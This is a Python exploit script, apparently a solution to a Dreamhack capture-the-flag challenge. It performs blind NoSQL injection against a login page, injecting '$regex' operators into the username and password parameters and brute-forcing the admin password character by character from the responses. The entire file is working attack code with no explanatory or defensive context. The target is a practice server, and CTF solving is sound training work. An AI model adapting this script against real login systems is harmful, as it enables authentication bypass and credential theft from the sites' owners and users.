import requests
import string
from alive_progress import alive_bar


def main() :

    URL = "http://host3.dreamhack.games:9507/login"
    result = ""
    ALPHANUMERIC = string.ascii_letters + string.digits

    with alive_bar(32) as bar : 
        for i in range(1, 33) :
            for ch in ALPHANUMERIC : 
                print(ch)
                param = {
                    "uid[$regex]" : "^adm",
                    "upw[$regex]" : "^D.{" + result + ch
                }

                response = requests.get(URL, params=param, verify=False)

                # print(response.text)

                if "admin" in response.text :
                    result += ch
                    print("tmp_result : ", result)
                    break

            bar()

    print("result : ", result)

if __name__ == "__main__" : 
    main()
